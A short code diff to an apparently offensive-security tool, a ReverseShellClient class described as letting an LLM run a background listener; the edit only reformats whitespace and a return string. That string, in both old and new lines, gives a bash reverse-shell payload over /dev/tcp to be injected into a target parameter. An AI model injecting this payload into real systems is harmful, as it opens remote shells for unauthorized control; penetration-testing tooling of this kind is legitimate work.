@@ -1,6 +1,8 @@
 import socket
 import sys
 import threading
+
+
 class ReverseShellClient:
     """
     A reverse shell client that runs in the background and allows the LLM to:
@@ -83,7 +85,8 @@ class ReverseShellClient:
         self.listener_thread.daemon = True
         self.listener_thread.start()
         self.socket.close()
-        return f"Listener started on {self.host}:{self.port} use this to trigger the reverse shell in the target parameter/vector bash -c 'bash -i >& /dev/tcp/LISTENER_PORT/4444 0>&1'" 
+        return f"Listener started on {self.host}:{
+            self.port} use this to trigger the reverse shell in the target parameter/vector bash -c 'bash -i >& /dev/tcp/LISTENER_PORT/4444 0>&1'"
 
     def stop(self):
         """
